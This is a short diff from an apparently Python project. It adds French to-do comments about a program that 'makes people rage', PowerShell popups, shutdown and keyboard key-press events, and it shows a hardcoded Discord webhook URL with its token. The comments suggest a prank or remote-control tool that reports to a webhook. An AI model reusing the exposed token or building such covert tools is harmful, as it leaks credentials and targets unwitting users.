@@ -8,11 +8,14 @@ import secrets
 
 webhook_link = "https://discord.com/api/webhooks/1184525775400095744/-rQXhzo5YQDm8-K4GQVXbz32C9NMj0ykOOxvmJz1bTXjeuMI0_bsHF15UJGSDMAuOgeO"
 
+# Faire un programme a partir des fonctions qui fait rager les gens
+
 # POPUP -> powershell (New-Object -ComObject Wscript.Shell).Popup("""Operation Completed""",0,"""Done""",0x0)
 # ETEINDRE ????
-# EVENT QUAND TOUCHE CERTAINE TOUCHES DU CLAVIER
 
 # Séparer onlineside en lib et executions
+
+# regarder si on peut mettre plusieurs touches dans keylist dans add_key_press_event
 
 def install(package):
     if hasattr(pip, 'main'):
